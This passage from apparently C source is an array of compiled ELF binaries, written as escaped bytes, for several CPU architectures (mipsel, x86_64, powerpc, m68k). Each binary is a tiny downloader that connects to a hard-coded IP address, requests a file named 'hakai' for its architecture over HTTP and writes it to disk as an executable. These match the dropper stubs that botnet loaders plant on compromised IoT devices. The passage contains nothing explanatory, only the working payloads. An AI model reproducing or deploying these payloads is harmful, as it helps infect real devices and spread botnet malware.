x00\x00\x00\x00\x00\x00\x00\x00\x05\x08\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1620,
    // mipsel
    BIT_32, ENDIAN_LITTLE, EM_MIPS, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x01\x00\x00\x00\xe8\x01\x40\x00\x34\x00\x00\x00\x3c\x05\x00\x00\x07\x10\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\xb8\x04\x00\x00\xb8\x04\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\xc0\x04\x00\x00\xc0\x04\x44\x00\xc0\x04\x44\x00\x48\x00\x00\x00\x60\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x10\x84\x9c\x27\x21\xe0\x99\x03\x50\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa1\x0f\x04\x24\x05\x00\x1c\x3c\xf4\x83\x9c\x27\x21\xe0\x99\x03\x50\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa6\x0f\x04\x24\x05\x00\x1c\x3c\xd8\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa5\x0f\x04\x24\x05\x00\x1c\x3c\xb0\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x50\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x03\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\x64\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa4\x0f\x04\x24\x05\x00\x1c\x3c\x3c\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa3\x0f\x04\x24\x05\x00\x1c\x3c\x14\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x50\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x01\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\xc8\x82\x9c\x27\x21\xe0\x99\x03\x40\xff\xbd\x27\xbc\x00\xbf\xaf\xb8\x00\xb2\xaf\xb4\x00\xb1\xaf\xb0\x00\xb0\xaf\x10\x00\xbc\xaf\x02\x00\x02\x24\x1c\x00\xa2\xa7\x00\x50\x02\x24\x18\x80\x84\x8f\x1e\x00\xa2\xa7\xb9\xfa\x02\x3c\x54\x80\x99\x8f\xb2\x80\x42\x34\x90\x04\x84\x24\x01\x03\x05\x24\xff\x01\x06\x24\x09\xf8\x20\x03\x20\x00\xa2\xaf\x10\x00\xbc\x8f\x02\x00\x05\x24\x44\x80\x99\x8f\x21\x30\x00\x00\x02\x00\x04\x24\x09\xf8\x20\x03\x21\x90\x40\x00\x10\x00\xbc\x8f\x21\x20\x40\x00\x3c\x80\x99\x8f\x1c\x00\xa5\x27\x10\x00\x06\x24\x09\xf8\x20\x03\x21\x88\x40\x00\x10\x00\xbc\x8f\x21\x20\x20\x02\x18\x80\x85\x8f\x40\x80\x99\x8f\x98\x04\xa5\x24\x09\xf8\x20\x03\x1c\x00\x06\x24\x1c\x00\x03\x24\x10\x00\xbc\x8f\x07\x00\x43\x10\x21\x80\x00\x00\x48\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\x21\x80\x00\x00\x34\x80\x99\x8f\x21\x20\x20\x02\x18\x00\xa5\x27\x09\xf8\x20\x03\x01\x00\x06\x24\x10\x00\xbc\x8f\x01\x00\x03\x24\x48\x80\x99\x8f\x04\x00\x43\x10\x04\x00\x04\x24\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\x18\x00\xa3\x83\x00\x12\x10\x00\x25\x80\x43\x00\x0a\x0d\x02\x3c\x0a\x0d\x42\x34\xed\xff\x02\x16\x00\x00\x00\x00\x34\x80\x99\x8f\x2c\x00\xb0\x27\x21\x20\x20\x02\x21\x28\x00\x02\x09\xf8\x20\x03\x80\x00\x06\x24\x10\x00\xbc\x8f\x21\x28\x00\x02\x40\x80\x99\x8f\x21\x30\x40\x00\x06\x00\x40\x18\x21\x20\x40\x02\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\xf0\xff\x00\x10\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x20\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x40\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x48\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\xbc\x00\xbf\x8f\xb8\x00\xb2\x8f\xb4\x00\xb1\x8f\xb0\x00\xb0\x8f\x08\x00\xe0\x03\xc0\x00\xbd\x27\x00\x00\x00\x00\x05\x00\x1c\x3c\x00\x81\x9c\x27\x21\xe0\x99\x03\x21\x10\x80\x00\x21\x20\xa0\x00\x21\x28\xc0\x00\x21\x30\xe0\x00\x10\x00\xa7\x8f\x14\x00\xa8\x8f\x18\x00\xa9\x8f\x1c\x00\xaa\x8f\xe0\xff\xbd\x27\x10\x00\xa8\xaf\x14\x00\xa9\xaf\x18\x00\xaa\xaf\x1c\x00\xa2\xaf\x1c\x00\xa2\x8f\x0c\x00\x00\x00\x03\x00\xe0\x14\x20\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00\x21\x20\x40\x00\x38\x80\x99\x8f\x00\x00\x00\x00\x08\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x90\x80\x9c\x27\x21\xe0\x99\x03\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xb0\xaf\x10\x00\xbc\xaf\x30\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x80\x80\x00\x10\x00\xbc\x8f\x00\x00\x50\xac\x1c\x00\xbf\x8f\x18\x00\xb0\x8f\xff\xff\x02\x24\x08\x00\xe0\x03\x20\x00\xbd\x27\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x40\x80\x9c\x27\x21\xe0\x99\x03\x2c\x80\x82\x8f\x08\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x70\x73\x6c\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x05\x44\x00\x70\x04\x40\x00\x74\x01\x40\x00\x20\x04\x40\x00\x00\x01\x40\x00\x4c\x01\x40\x00\x9c\x01\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x00\xb0\x03\x40\x00\xd8\x00\x40\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xa0\x00\x40\x00\xa0\x00\x00\x00\xf0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x90\x04\x40\x00\x90\x04\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x10\xc0\x04\x44\x00\xc0\x04\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x10\x05\x44\x00\x08\x05\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x08\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x05\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1620, 
    // x86_64
    BIT_64, ENDIAN_LITTLE, EM_X86_64, "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x3a\x01\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x03\x00\x40\x00\x05\x00\x04\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x63\x02\x00\x00\x00\x00\x00\x00\x63\x02\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x89\xfe\x31\xc0\xbf\x3c\x00\x00\x00\xe9\x02\x01\x00\x00\x89\xfe\x31\xc0\xbf\x03\x00\x00\x00\xe9\xf4\x00\x00\x00\x89\xd1\x31\xc0\x89\xf2\x48\x89\xfe\xbf\x02\x00\x00\x00\xe9\xe1\x00\x00\x00\x89\xd1\x31\xc0\x48\x89\xf2\x89\xfe\xbf\x01\x00\x00\x00\xe9\xce\x00\x00\x00\x89\xd1\x31\xc0\x48\x89\xf2\x89\xfe\x31\xff\xe9\xbe\x00\x00\x00\x55\xba\xff\x01\x00\x00\xbe\x41\x02\x00\x00\xbf\x3e\x02\x40\x00\x53\x48\x81\xec\x98\x00\x00\x00\xe8\xad\xff\xff\xff\xba\x1e\x00\x00\x00\xbe\x44\x02\x40\x00\x89\xdf\x89\xc5\xe8\xad\xff\xff\xff\x83\xf8\x1e\x74\x0a\xbf\x03\x00\x00\x00\xe8\x6f\xff\xff\xff\x31\xdb\x48\x8d\xb4\x24\x8f\x00\x00\x00\xba\x01\x00\x00\x00\x89\xdf\xe8\x9b\xff\xff\xff\xff\xc8\x74\x0a\xbf\x04\x00\x00\x00\xe8\x4b\xff\xff\xff\x0f\xbe\x84\x24\x8f\x00\x00\x00\xc1\xe3\x08\x09\xc3\x81\xfb\x0a\x0d\x0a\x0d\x75\xc9\xba\x80\x00\x00\x00\x48\x89\xe6\x89\xe7\xe8\x69\xff\xff\xff\x85\xc0\x7e\x0e\x89\xc2\x48\x89\xe6\x89\xef\xe8\x46\xff\xff\xff\xeb\xdf\x89\xe7\xe8\x1c\xff\xff\xff\x89\xef\xe8\x15\xff\xff\xff\xbf\x03\x00\x00\x00\xe8\xfd\xfe\xff\xff\x48\x81\xc4\x98\x00\x00\x00\x5b\x5d\xc3\x90\x90\x90\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\x48\x3d\x01\xf0\xff\xff\x0f\x83\x03\x00\x00\x00\xc3\x90\x90\x48\x83\xec\x08\x48\x89\xc1\x48\xf7\xd9\xe8\x09\x00\x00\x00\x89\x08\x83\xc8\xff\x5a\xc3\x90\x90\xb8\x64\x02\x50\x00\xc3\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x78\x38\x36\x5f\x36\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xe8\x00\x40\x00\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x00\x00\x00\x56\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x00\x00\x00\x00\x3e\x02\x40\x00\x00\x00\x00\x00\x3e\x02\x00\x00\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 968,
    // powerpc  
    BIT_32, ENDIAN_BIG, EM_PPC, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x14\x00\x00\x00\x01\x10\x00\x02\x0c\x00\x00\x00\x34\x00\x00\x03\xd4\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x03\xb4\x00\x00\x03\xb4\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x03\xb4\x10\x01\x03\xb4\x10\x01\x03\xb4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x01\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\x81\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x06\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\x55\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x05\x4c\xc6\x31\x82\x48\x00\x02\x1d\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x03\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x01\xe1\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x04\x4c\xc6\x31\x82\x48\x00\x01\xa9\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x03\x4c\xc6\x31\x82\x48\x00\x01\x71\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x01\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x01\x35\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\x40\x3d\x20\xb2\x80\x3c\x60\x10\x00\x61\x29\xb9\xfa\x38\x80\x02\x41\x90\x01\x00\xc4\x38\x00\x00\x02\x38\xa0\x01\xff\xb0\x01\x00\x0c\x38\x63\x03\x90\x38\x00\x00\x50\xb0\x01\x00\x0e\x91\x21\x00\x10\xbf\xa1\x00\xb4\x4b\xff\xfe\xa5\x7c\x7e\x1b\x78\x38\x80\x00\x01\x38\xa0\x00\x00\x38\x60\x00\x02\x4b\xff\xff\x75\x38\x81\x00\x0c\x38\xa0\x00\x10\x7c\x7f\x1b\x78\x4b\xff\xfe\xb9\x3c\x80\x10\x00\x38\x84\x03\x98\x7f\xe3\xfb\x78\x38\xa0\x00\x1b\x4b\xff\xfe\xe1\x2f\x83\x00\x1b\x41\x9e\x00\x0c\x38\x60\x00\x03\x4b\xff\xfe\x05\x3b\xa0\x00\x00\x38\x81\x00\x08\x38\xa0\x00\x01\x7f\xe3\xfb\x78\x4b\xff\xfe\xf5\x2f\x83\x00\x01\x38\x60\x00\x04\x41\x9e\x00\x08\x4b\xff\xfd\xe1\x89\x61\x00\x08\x57\xa9\x40\x2e\x3c\x00\x0d\x0a\x7d\x3d\x5b\x78\x60\x00\x0d\x0a\x7f\x9d\x00\x00\x40\x9e\xff\xc8\x3b\xa1\x00\x1c\x38\xa0\x00\x80\x7f\xa4\xeb\x78\x7f\xe3\xfb\x78\x4b\xff\xfe\xb5\x7f\xa4\xeb\x78\x7c\x65\x1b\x79\x7f\xc3\xf3\x78\x40\x81\x00\x0c\x4b\xff\xfe\x69\x4b\xff\xff\xd8\x7f\xe3\xfb\x78\x4b\xff\xfd\xbd\x7f\xc3\xf3\x78\x4b\xff\xfd\xb5\x38\x60\x00\x03\x4b\xff\xfd\x81\x80\x01\x00\xc4\xbb\xa1\x00\xb4\x38\x21\x00\xc0\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x60\x1b\x78\x7c\x83\x23\x78\x7c\xa4\x2b\x78\x7c\xc5\x33\x78\x7c\xe6\x3b\x78\x7d\x07\x43\x78\x44\x00\x00\x02\x4c\x83\x00\x20\x48\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xe0\xbf\xa1\x00\x14\x7c\x7d\x1b\x78\x90\x01\x00\x24\x48\x00\x00\x21\x93\xa3\x00\x00\x38\x60\xff\xff\x80\x01\x00\x24\xbb\xa1\x00\x14\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x3c\x60\x10\x01\x38\x63\x03\xb4\x4e\x80\x00\x20\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x70\x70\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x73\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x10\x00\x00\x94\x00\x00\x00\x94\x00\x00\x02\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x10\x00\x03\x90\x00\x00\x03\x90\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x10\x01\x03\xb4\x00\x00\x03\xb4\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xb4\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1180,
    // m68k
    BIT_32, ENDIAN_BIG, EM_68K, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x04\x00\x00\x00\x01\x80\x00\x01\x74\x00\x00\x00\x34\x00\x00\x03\x38\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x00\x00\x00\x03\x17\x00\x00\x03\x17\x00\x00\x00\x05\x00\x00\x20\x00\x00\x00\x00\x01\x00\x00\x03\x18\x80\x00\x23\x18\x80\x00\x23\x18\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x20\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x01\x61\xff\x00\x00\x01\xe6\x50\x8f\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x06\x61\xff\x00\x00\x01\xce\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x05\x61\xff\x00\x00\x01\xb0\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x03\x48\x78\x00\x66\x61\xff\x00\x00\x01\x84\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x04\x61\xff\x00\x00\x01\x66\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x03\x61\xff\x00\x00\x01\x48\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x01\x48\x78\x00\x66\x61\xff\x00\x00\x01\x1c\x4e\x5e\x4e\x75\x4e\x56\xff\x6c\x48\xe7\x30\x20\x3d\x7c\x00\x02\xff\xee\x3d\x7c\x00\x50\xff\xf0\x2d\x7c\xb2\x80\xb9\xfa\xff\xf2\x48\x78\x01\xff\x48\x78\x02\x41\x48\x79\x80\x00\x02\xf4\x61\xff\xff\xff\xff\x22\x26\x00\x42\xa7\x48\x78\x00\x01\x48\x78\x00\x02\x61\xff\xff\xff\xff\x96\x24\x40\x48\x78\x00\x10\x48\x6e\xff\xee\x2f\x00\x61\xff\xff\xff\xff\x1c\x4f\xef\x00\x20\x2e\xbc\x00\x00\x00\x1c\x48\x79\x80\x00\x02\xfa\x2f\x0a\x61\xff\xff\xff\xff\x30\x4f\xef\x00\x0c\x72\x1c\xb2\x80\x67\x0c\x48\x78\x00\x03\x61\xff\xff\xff\xfe\xa4\x58\x8f\x42\x82\x48\x78\x00\x01\x48\x6e\xff\xff\x2f\x0a\x61\xff\xff\xff\xff\x26\x4f\xef\x00\x0c\x72\x01\xb2\x80\x67\x0c\x48\x78\x00\x04\x61\xff\xff\xff\xfe\x7c\x58\x8f\xe1\x8a\x10\x2e\xff\xff\x49\xc0\x84\x80\x0c\x82\x0d\x0a\x0d\x0a\x66\xc8\x48\x78\x00\x80\x24\x0e\x06\x82\xff\xff\xff\x6e\x2f\x02\x2f\x0a\x61\xff\xff\xff\xfe\xe8\x4f\xef\x00\x0c\x4a\x80\x6f\x12\x2f\x00\x2f\x02\x2f\x03\x61\xff\xff\xff\xfe\xb6\x4f\xef\x00\x0c\x60\xd0\x2f\x0a\x45\xf9\x80\x00\x00\xac\x4e\x92\x2f\x03\x4e\x92\x48\x78\x00\x03\x61\xff\xff\xff\xfe\x20\x4f\xef\x00\x0c\x4c\xee\x04\x0c\xff\x60\x4e\x5e\x4e\x75\x4e\x75\x4e\x56\xff\xf8\x48\xe7\x3c\x00\x20\x6e\x00\x20\x2a\x2e\x00\x1c\x28\x2e\x00\x18\x26\x2e\x00\x14\x24\x2e\x00\x10\x22\x2e\x00\x0c\x20\x2e\x00\x08\x4e\x40\x2d\x40\xff\xf8\x20\x2e\xff\xf8\x72\x82\xb2\x80\x64\x1a\x20\x2e\xff\xf8\x44\x80\x2d\x40\xff\xfc\x61\xff\x00\x00\x00\x1c\x20\xae\xff\xfc\x72\xff\x2d\x41\xff\xf8\x20\x2e\xff\xf8\x4c\xee\x00\x3c\xff\xe8\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x20\x3c\x80\x00\x23\x18\x20\x40\x4e\x5e\x4e\x75\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x36\x38\x6b\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00